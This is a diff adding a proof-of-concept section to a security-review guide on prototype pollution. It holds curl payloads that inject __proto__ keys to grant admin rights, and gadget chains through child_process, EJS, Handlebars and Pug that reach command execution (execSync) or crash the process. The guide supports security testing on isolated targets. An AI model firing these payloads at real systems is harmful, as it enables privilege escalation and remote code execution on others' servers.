@@ -819,6 +819,53 @@ Python/Go/Java/Ruby/Rust server-side prototype pollution is not modeled (languag
 
 ---
 
+## Dynamic Test / PoC
+
+**JSON body pollution** — merge/patch/profile endpoints:
+
+```bash
+curl -X POST 'https://TARGET/api/settings' \
+  -H 'Content-Type: application/json' \
+  -d '{"__proto__":{"isAdmin":true}}'
+
+curl -X PATCH 'https://TARGET/api/user/profile' \
+  -H 'Content-Type: application/json' \
+  -d '{"constructor":{"prototype":{"role":"admin"}}}'
+
+curl -X PUT 'https://TARGET/api/config' \
+  -H 'Content-Type: application/json' \
+  -d '{"a":{"__proto__":{"polluted":true}}}'
+```
+
+**Pollution reflection** — sibling `__proto__` key echoed back without the key name (see Black-Box Indicators §1); in console on isolated targets: `({}).isAdmin` / `({}).polluted` after merge.
+
+**Gadget-to-RCE probes** — staging/isolated targets only; do not run on shared production:
+
+```bash
+# child_process / execArgv chain
+curl -X POST 'https://TARGET/api/merge' \
+  -H 'Content-Type: application/json' \
+  -d '{"__proto__":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"id\").toString())","NODE_OPTIONS":"--require /proc/self/cmdline"}}'
+
+# EJS outputFunctionName gadget
+curl -X POST 'https://TARGET/api/settings' \
+  -H 'Content-Type: application/json' \
+  -d '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\"child_process\").execSync(\"id\");s"}}'
+
+# Handlebars AST gadget
+curl -X POST 'https://TARGET/api/settings' \
+  -H 'Content-Type: application/json' \
+  -d '{"__proto__":{"type":"Program","body":[{"type":"MustacheStatement","params":[],"path":{"type":"PathExpression","original":"constructor"}}]}}'
+```
+
+**Express/Pug block gadget** (when Pug renders after merge):
+
+```json
+{"__proto__":{"block":{"type":"Text","val":"x]));process.exit()//"}}}
+```
+
+---
+
 ## Confirming a Finding
 
 1. Identify the pollution sink: name the function (`_.merge`, `_.set`, `qs.parse({allowPrototypes:true})`, hand-rolled `for…in`, etc.) and show the file/line.
